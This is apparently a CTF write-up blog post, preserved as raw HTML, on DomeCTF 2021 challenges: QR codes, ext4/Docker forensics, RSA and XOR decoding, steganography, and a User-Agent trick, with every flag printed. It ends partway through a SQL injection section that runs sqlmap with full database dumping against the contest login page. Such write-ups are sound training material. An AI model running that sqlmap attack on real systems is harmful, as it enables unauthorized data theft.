@@ -1,0 +1,537 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="DomeCTF 2021" /><meta name="author" content="Vishnu Sudhakaran" /><meta property="og:locale" content="en_US" /><meta name="description" content="Cyber Security Blogs / CTF Writeups" /><meta property="og:description" content="Cyber Security Blogs / CTF Writeups" /><link rel="canonical" href="https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/" /><meta property="og:url" content="https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/" /><meta property="og:site_name" content="an0n4ce" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-11-19T22:57:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="DomeCTF 2021" /><meta name="twitter:site" content="@an0n4ce" /><meta name="twitter:creator" content="@Vishnu Sudhakaran" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Vishnu Sudhakaran"},"dateModified":"2021-11-20T10:22:27+05:30","datePublished":"2021-11-19T22:57:00+05:30","description":"Cyber Security Blogs / CTF Writeups","headline":"DomeCTF 2021","mainEntityOfPage":{"@type":"WebPage","@id":"https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/"},"url":"https://an0n4ce.github.io/blog/posts/domectf-2021-writeup/"}</script><title>DomeCTF 2021 | an0n4ce</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="an0n4ce"><meta name="application-name" content="an0n4ce"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">an0n4ce</a></div><div class="site-subtitle font-italic">CEH / Pentester / Security 3nthusias7</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/an0n4ce" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/an0n4ce" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['an0n4ce','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>DomeCTF 2021</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>DomeCTF 2021</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Vishnu Sudhakaran </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Nov 19, 2021, 10:57 PM +0530" >Nov 19, 2021<i class="unloaded">2021-11-19T22:57:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Nov 20, 2021, 10:22 AM +0530" >Nov 20, 2021<i class="unloaded">2021-11-20T10:22:27+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2058 words">11 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/DomeCTF.png" alt="" /></p><p>We Secured 7th Position At <strong>DomeCTF</strong> as Part of <strong>c0c0n 2021 Conference</strong>, Conducted by <strong>Kerala Police Cyberdome</strong> And <strong>Beagle Security</strong>.</p><h1 id="challenges-writeups">Challenges Writeups</h1><h2 id="brazil---quick">Brazil - Quick</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/bra/Brazil.png" alt="" /></p><p>Challenge: <a href="https://play.domectf.in/data/attachment.php?id=13">quick_703471b249918e8fc14f95ba119bb7af.zip</a></p><p>We can see here 5 QR Codes after extracting the given file. Use any online <a href="https://qrscanneronline.com/">QRreader</a> to get your flag parts.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/bra/1.png" alt="" /></p><p>Combine all parts and submit the flag.</p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{fSFTiyvC9AvkTH2íecvNMTFg3kS6HWWG}  
+</pre></table></code></div></div><hr /><h2 id="pakistan---ambergris">Pakistan - Ambergris</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/pak/pak.png" alt="" /></p><p>Challenge: <a href="https://mega.nz/file/QUsU1QZS#9BlLhbaEJSSkqW-H22TcT1VzqozyHTl5kQruse00hXg">malicious.7z</a></p><p>After extrating the file, we can see it’s a <code class="language-plaintext highlighter-rouge">filesystem data</code> using <code class="language-plaintext highlighter-rouge">file</code> command.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre><td class="rouge-code"><pre>➜  7z x malicious.7z                               
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_IN,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,8 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-9300H CPU @ 2.40GHz <span class="o">(</span>906EA<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 56868345 bytes <span class="o">(</span>55 MiB<span class="o">)</span>
+
+Extracting archive: malicious.7z
+<span class="nt">--</span>
+Path <span class="o">=</span> malicious.7z
+Type <span class="o">=</span> 7z
+Physical Size <span class="o">=</span> 56868345
+Headers Size <span class="o">=</span> 145
+Method <span class="o">=</span> LZMA:23
+Solid <span class="o">=</span> -
+Blocks <span class="o">=</span> 1
+
+Everything is Ok
+
+Size:       314572800
+Compressed: 56868345
+
+➜  file malicious                                                                                                                        
+malicious: Linux rev 1.0 ext4 filesystem data, <span class="nv">UUID</span><span class="o">=</span>00ed61e1-1230-4818-bffa-305e19e53758 <span class="o">(</span>needs journal recovery<span class="o">)</span> <span class="o">(</span>extents<span class="o">)</span> <span class="o">(</span>64bit<span class="o">)</span> <span class="o">(</span>large files<span class="o">)</span> <span class="o">(</span>huge files<span class="o">)</span> 
+
+</pre></table></code></div></div><p>Choose a <code class="language-plaintext highlighter-rouge">mount point</code>. and <code class="language-plaintext highlighter-rouge">mount</code> the file system.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  <span class="nb">sudo mkdir</span> <span class="nt">-p</span> /mnt/malicious       
+
+➜  <span class="nb">sudo </span>mount malicious /mnt/malicious
+</pre></table></code></div></div><p>When going through all the files, we can see an interesting archive file called <code class="language-plaintext highlighter-rouge">supersecretcontainer.tar.gz</code> on <code class="language-plaintext highlighter-rouge">/var/lib/docker/image </code> directory. Extract the archive file.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>➜  <span class="nb">sudo tar</span> <span class="nt">-xvf</span> supersecretcontainer.tar.gz                                                                                                                                                                                       
+7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/
+7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/VERSION
+7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/json
+7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d/layer.tar
+c2bbf02590be7c163c32b7cd885243c802737dec748bda40bc4fe5d3afd1d016.json
+d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/
+d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/VERSION
+d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/json
+d217f9f84361ca13df075de8c820094eca5a952bdb27ca9edfbd711dcc9ed5ae/layer.tar
+manifest.json
+
+➜  <span class="nb">cd </span>7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d<span class="p">;</span> <span class="nb">ls    
+</span>json  layer.tar  VERSION
+
+</pre></table></code></div></div><p>And get into the first directory called <code class="language-plaintext highlighter-rouge">7176abfdb1534694dc0340677243a324a0416cf2f5e5349242f87a284af3d21d</code> and there will be an another archive file called <code class="language-plaintext highlighter-rouge">layer.tar</code>. Extract it and in <code class="language-plaintext highlighter-rouge">/root/.ash_history</code> there will the flag.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+</pre><td class="rouge-code"><pre>➜  <span class="nb">sudo tar</span> <span class="nt">-xvf</span> layer.tar
+root/
+root/.ash_history
+
+➜  <span class="nb">sudo cat </span>root/.ash_history
+<span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">cd </span>root
+<span class="nb">ls
+cd</span> ../<span class="se">\</span>
+<span class="nb">exit
+cd </span>home
+<span class="nb">ls
+cd </span>home
+<span class="nb">cd</span> ../
+<span class="nb">ls
+cd </span>home
+<span class="nb">ls
+pwd
+</span>s
+<span class="nb">ls
+echo </span>domectf<span class="o">{</span>c7nAPFtZRPSwvonJTVVONtI793OxEKYu<span class="o">}</span>
+<span class="nb">ls
+ls</span> <span class="nt">-la</span>
+
+</pre></table></code></div></div><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{c7nAPFtZRPSwvonJTVVONtI793OxEKYu}
+</pre></table></code></div></div><hr /><h2 id="madagascar---the-cute-beagle">Madagascar - The Cute Beagle</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mada/mada.png" alt="" /></p><p>Challenge : <a href="https://play.domectf.in/data/attachment.php?id=4">cute_beagle_372a2935c95c17d8a21bf87a5244dc6f.zip</a></p><p>In the given file, there is an <code class="language-plaintext highlighter-rouge">secret.txt</code> that contains cipher text encrypted with <code class="language-plaintext highlighter-rouge">RSA</code> algorithm, and a picture of a Cute Beagle.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>➜  <span class="nb">cat </span>secret.txt 
+n <span class="o">=</span>  8281850967132278399574272688766937486036646313403007679588335903785669628431708760927341727806006769095252325575815709840401878674105658204057327337750902945521512357960818523078486774689928139816732080923197367563639383252762498921096166065153092144335239373370093976823925031794323976150363874930075228846801224430767428594024165529140949082062667410186456029480046489969338885725614510660737026927443934115006027747874368836800022473917576424175601374800697491622086825964475396316066082109998646438504664272000556702241576240616765962934452557847306066736505798267513078073147161755828577875047115978481485076227911405625234425533967247248864837854031634968764570599279385827285321806293661331225163255461894680337693227417748934924109356565823327149859245521513696171473417470936260563397398387972467438182651142096935931112668743912944902147582538985769095457203775208567489073198557073226907349118348902079942096374377432431441166710584381655348979330535397040250376989291669788189409825278457889980676574146044704329826483808929549888234303934178478274711686806257841293265249466735277673158607466360053037971774844824065612178793324128914371112619033111301900922374201703477207948412866443213080633623441392016518823291181
+
+c <span class="o">=</span> 7553952599519757514650115101968852952632457825888625001855418429934419115490882905266945326549436851642489309729477565720592544910214642660523318082160282397451000977681199865455504233402544779560452052341860254252594964025545390908688658630604830781093888327232262187416382053054266892435337677590408483030315477397944352020337351816182538214066074910751820705392399933743688656782991849052752888215258162228567159881795674122623278541751568850766501951705244720482703806961392404219022484905860257184780259868119722626663928994319252730187684597321067739480015362570018930800614161624561619273941783278882977922391010874205768295537255330351411253610730509222243591741176802679884353785309041684947698704947447387482758911352194380979688722291068032208637717416116605429232964038251293407669447328612631867524221830677475348810954818389966117074182770181052445829237462436261410600737121390111874288880285025770530671181565432903245986879191414817645921644507825258172114567799795914132063799352233655660572120141434514035727034044356001099693512670196634137010411122236155349319295976202485129049828008976282635389623975908153735272346355684401082959081182915773654445242977812924717649231020404038985558599818616300812067086475
+
+e <span class="o">=</span> 65537
+
+</pre></table></code></div></div><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mada/TheCuteBeagle.jpeg" alt="TheCuteBeagle" /></p><p>What is interesting part here when you use <code class="language-plaintext highlighter-rouge">binwalk</code> on Beagle picture, You can see a compressed <code class="language-plaintext highlighter-rouge">secret.wav</code> file. Extract it using <code class="language-plaintext highlighter-rouge">-e</code> switch.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre><td class="rouge-code"><pre>➜  binwalk <span class="nt">-e</span> TheCuteBeagle.jpeg 
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+<span class="nt">--------------------------------------------------------------------------------</span>
+0             0x0             JPEG image data, JFIF standard 1.01
+499738        0x7A01A         Zip archive data, encrypted compressed size: 3445919, uncompressed size: 3840404, name: secret.wav
+3945811       0x3C3553        End of Zip archive, footer length: 22
+ 
+</pre></table></code></div></div><p>It’s a archive file and password protected. We will get that password when we decrypt that <code class="language-plaintext highlighter-rouge">RSA</code> cipher. Here i used <a href="https://github.com/X-Vector/X-RSA">X-RSA</a> tool to decrypt.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre><td class="rouge-code"><pre>➜  python3 /opt/tools/X-RSA/Attack.py
+
+_____       ________________                  _____      _____
+<span class="se">\ </span>   <span class="se">\ </span>    /    /<span class="se">\ </span>         <span class="se">\ </span>           _____<span class="se">\ </span>   <span class="se">\ </span>  /      |_
+ <span class="se">\ </span>   |   |    /  <span class="se">\ </span>   /<span class="se">\ </span>   <span class="se">\ </span>         /    / <span class="se">\ </span>   | /         <span class="se">\</span>
+  <span class="se">\ </span>   <span class="se">\ </span>/    /    |   <span class="se">\_\ </span>   |        |    |  /___/||     /<span class="se">\ </span>   <span class="se">\</span>
+   <span class="se">\ </span>   |    /     |      ___/      ____<span class="se">\ </span>   <span class="se">\ </span>|   <span class="o">||</span>|    |  |    <span class="se">\</span>
+   /    |    <span class="se">\ </span>    |      <span class="se">\ </span> ____  /    /<span class="se">\ </span>   <span class="se">\|</span>___|/|     <span class="se">\/</span>      <span class="se">\</span>
+  /    /|<span class="se">\ </span>   <span class="se">\ </span>  /     /<span class="se">\ \/</span>    <span class="se">\|</span>    |/ <span class="se">\ </span>   <span class="se">\ </span>    |<span class="se">\ </span>     /<span class="se">\ </span>    <span class="se">\</span>
+ |____|/ <span class="se">\|</span>____| /_____/ |<span class="se">\_</span>_____||<span class="se">\_</span>___<span class="se">\ </span>/____/|    | <span class="se">\_</span>____<span class="se">\ \_</span>____<span class="se">\</span>
+ |    |   |    | |     | | |     <span class="o">||</span> |   <span class="o">||</span>    | |    | |     | |     |
+ |____|   |____| |_____|/ <span class="se">\|</span>_____| <span class="se">\|</span>___||____|/      <span class="se">\|</span>_____|<span class="se">\|</span>_____|
+  
+<span class="o">[</span> Version : 0.4 <span class="o">]</span>
+<span class="o">[</span> Author  : X-Vector <span class="o">]</span>
+<span class="o">[</span> Github  : github.com/X-Vector <span class="o">]</span>
+<span class="o">[</span> Twitter : twitter.com/@XVector11 <span class="o">]</span>
+<span class="o">[</span> Facebook: facebook.com/X.Vector1 <span class="o">]</span>
+<span class="o">[</span> GreeteZ : Karem Ali <span class="o">]</span>
+    
+<span class="o">&gt;&gt;&gt;</span> c <span class="o">=</span> 7553952599519757514650115101968852952632457825888625001855418429934419115490882905266945326549436851642489309729477565720592544910214642660523318082160282397451000977681199865455504233402544779560452052341860254252594964025545390908688658630604830781093888327232262187416382053054266892435337677590408483030315477397944352020337351816182538214066074910751820705392399933743688656782991849052752888215258162228567159881795674122623278541751568850766501951705244720482703806961392404219022484905860257184780259868119722626663928994319252730187684597321067739480015362570018930800614161624561619273941783278882977922391010874205768295537255330351411253610730509222243591741176802679884353785309041684947698704947447387482758911352194380979688722291068032208637717416116605429232964038251293407669447328612631867524221830677475348810954818389966117074182770181052445829237462436261410600737121390111874288880285025770530671181565432903245986879191414817645921644507825258172114567799795914132063799352233655660572120141434514035727034044356001099693512670196634137010411122236155349319295976202485129049828008976282635389623975908153735272346355684401082959081182915773654445242977812924717649231020404038985558599818616300812067086475
+<span class="o">&gt;&gt;&gt;</span> n <span class="o">=</span> 8281850967132278399574272688766937486036646313403007679588335903785669628431708760927341727806006769095252325575815709840401878674105658204057327337750902945521512357960818523078486774689928139816732080923197367563639383252762498921096166065153092144335239373370093976823925031794323976150363874930075228846801224430767428594024165529140949082062667410186456029480046489969338885725614510660737026927443934115006027747874368836800022473917576424175601374800697491622086825964475396316066082109998646438504664272000556702241576240616765962934452557847306066736505798267513078073147161755828577875047115978481485076227911405625234425533967247248864837854031634968764570599279385827285321806293661331225163255461894680337693227417748934924109356565823327149859245521513696171473417470936260563397398387972467438182651142096935931112668743912944902147582538985769095457203775208567489073198557073226907349118348902079942096374377432431441166710584381655348979330535397040250376989291669788189409825278457889980676574146044704329826483808929549888234303934178478274711686806257841293265249466735277673158607466360053037971774844824065612178793324128914371112619033111301900922374201703477207948412866443213080633623441392016518823291181
+<span class="o">&gt;&gt;&gt;</span> e <span class="o">=</span> 65537
+
+PlainText <span class="k">in </span>Decimal : 1797147753856124285537
+PlainText <span class="k">in </span>hex : 616c6f686f6d6f7261
+PlainText <span class="k">in </span>ascii : alohomora
+</pre></table></code></div></div><p>We got the password it is <code class="language-plaintext highlighter-rouge">alohomora</code>, Now extract the archive file.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre><td class="rouge-code"><pre>➜  7z x 7A01A.zip   
+
+7-Zip <span class="o">[</span>64] 16.02 : Copyright <span class="o">(</span>c<span class="o">)</span> 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 <span class="o">(</span><span class="nv">locale</span><span class="o">=</span>en_IN,Utf16<span class="o">=</span>on,HugeFiles<span class="o">=</span>on,64 bits,8 CPUs Intel<span class="o">(</span>R<span class="o">)</span> Core<span class="o">(</span>TM<span class="o">)</span> i5-9300H CPU @ 2.40GHz <span class="o">(</span>906EA<span class="o">)</span>,ASM,AES-NI<span class="o">)</span>
+
+Scanning the drive <span class="k">for </span>archives:
+1 file, 3446095 bytes <span class="o">(</span>3366 KiB<span class="o">)</span>
+
+Extracting archive: 7A01A.zip
+<span class="nt">--</span>
+Path <span class="o">=</span> 7A01A.zip
+Type <span class="o">=</span> zip
+Physical Size <span class="o">=</span> 3446095
+
+    
+Would you like to replace the existing file:
+  Path:     ./secret.wav
+  Size:     0 bytes
+  Modified: 2021-11-10 15:57:38
+with the file from archive:
+  Path:     secret.wav
+  Size:     3840404 bytes <span class="o">(</span>3751 KiB<span class="o">)</span>
+  Modified: 2021-11-10 15:57:38
+? <span class="o">(</span>Y<span class="o">)</span>es / <span class="o">(</span>N<span class="o">)</span>o / <span class="o">(</span>A<span class="o">)</span>lways / <span class="o">(</span>S<span class="o">)</span>kip all / A<span class="o">(</span>u<span class="o">)</span>to rename all / <span class="o">(</span>Q<span class="o">)</span>uit? y
+
+                 
+Enter password <span class="o">(</span>will not be echoed<span class="o">)</span>:
+Everything is Ok 
+
+Size:       3840404
+Compressed: 3446095
+
+</pre></table></code></div></div><p>Play that file and it’s a Cricket commentary, after 10 sec there is something suspicious we can hear that. Open it with <code class="language-plaintext highlighter-rouge">Audacity</code> and use <code class="language-plaintext highlighter-rouge">Spectrogram</code>.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mada/1.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>171f0806170609491645375a122b3f4a16320d2d213f167940010236321f2a683e282012230a3e600e
+</pre></table></code></div></div><p>It’s a <code class="language-plaintext highlighter-rouge">Hex</code> String encoded with <code class="language-plaintext highlighter-rouge">XOR</code>. Decode it using <a href="https://gchq.github.io/CyberChef/">CyberChef</a>, We all know <code class="language-plaintext highlighter-rouge">XOR</code> need a key to decode, So here i take <code class="language-plaintext highlighter-rouge">domectf{</code> as key then in the result we can see word <code class="language-plaintext highlighter-rouge">spectro2</code> and some characters.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mada/2.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">spectro2</code> is the right key to get the flag.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mada/3.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{e5R9fYPxeBhNUMyK3qgUFmEZMXEqWxQR}
+</pre></table></code></div></div><hr /><h2 id="mexico---whoami">Mexico - whoami</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mex/Mex.png" alt="" /></p><p>Challenge: <a href="https://whoami.2021.domectf.in/">https://whoami.2021.domectf.in/</a></p><p>In the webpage we see some <code class="language-plaintext highlighter-rouge">User-Agent</code> information.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mex/1.png" alt="" /></p><p>The challenge is something about <code class="language-plaintext highlighter-rouge">User-Agent</code>, what is the interesting part here we can see at bottom <code class="language-plaintext highlighter-rouge">Powered by : Yandex</code>, So i choose <code class="language-plaintext highlighter-rouge">Yandex Browser</code> as a User-Agent with <code class="language-plaintext highlighter-rouge">User-Agent Switcher</code> extention, Just refresh the page you will get your flag at bottom.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/mex/2.png" alt="" /></p><div lang="plaintext" class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>domectf{yazxBEsZbtP7d8cecSJWyXRRmdM5msLB}
+</pre></table></code></div></div><hr /><h2 id="united-states---brut">United States - brut</h2><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/us/us.png" alt="" /></p><p>Challenge: <a href="https://brut.2021.domectf.in/">https://brut.2021.domectf.in/</a></p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/domectf/us/1.png" alt="" /></p><p>The Login page is vulnerable for <code class="language-plaintext highlighter-rouge">sql injection</code>. Here i used <a href="https://sqlmap.org/">sqlmap</a> to automate the process.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+75
+76
+77
+</pre><td class="rouge-code"><pre>➜  sqlmap <span class="s2">"https://brut.2021.domectf.in/"</span> <span class="nt">--forms</span> <span class="nt">--dump-all</span> <span class="nt">--batch</span>
+        ___
+       __H__
+ ___ ___[<span class="s1">']_____ ___ ___  {1.5.10#stable}
+|_ -| . [)]     | .'</span>| <span class="nb">.</span> |
+|___|_  <span class="o">[</span>.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+<span class="o">[!]</span> legal disclaimer: Usage of sqlmap <span class="k">for </span>attacking targets without prior mutual consent is illegal. It is the end user<span class="s1">'s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 21:27:59 /2021-11-19/
+
+[21:28:00] [INFO] testing connection to the target URL
+[21:28:01] [INFO] searching for forms
+[1/1] Form:
+POST https://brut.2021.domectf.in/web/login.php
+POST data: username=&amp;password=
+do you want to test this form? [Y/n/q] 
+&gt; Y
+Edit POST data [default: username=&amp;password=] (Warning: blank fields detected): username=&amp;password=
+do you want to fill blank fields with random values? [Y/n] Y
+[21:28:03] [INFO] using '</span>/home/an0n4ce/.local/share/sqlmap/output/results-11192021_0928pm.csv<span class="s1">' as the CSV results file in multiple targets mode
+[21:28:05] [INFO] checking if the target is protected by some kind of WAF/IPS
+[21:28:06] [INFO] testing if the target URL content is stable
+[21:28:07] [INFO] target URL content is stable
+[21:28:07] [INFO] testing if POST parameter '</span>username<span class="s1">' is dynamic
+[21:28:08] [WARNING] POST parameter '</span>username<span class="s1">' does not appear to be dynamic
+[21:28:09] [WARNING] heuristic (basic) test shows that POST parameter '</span>username<span class="s1">' might not be injectable
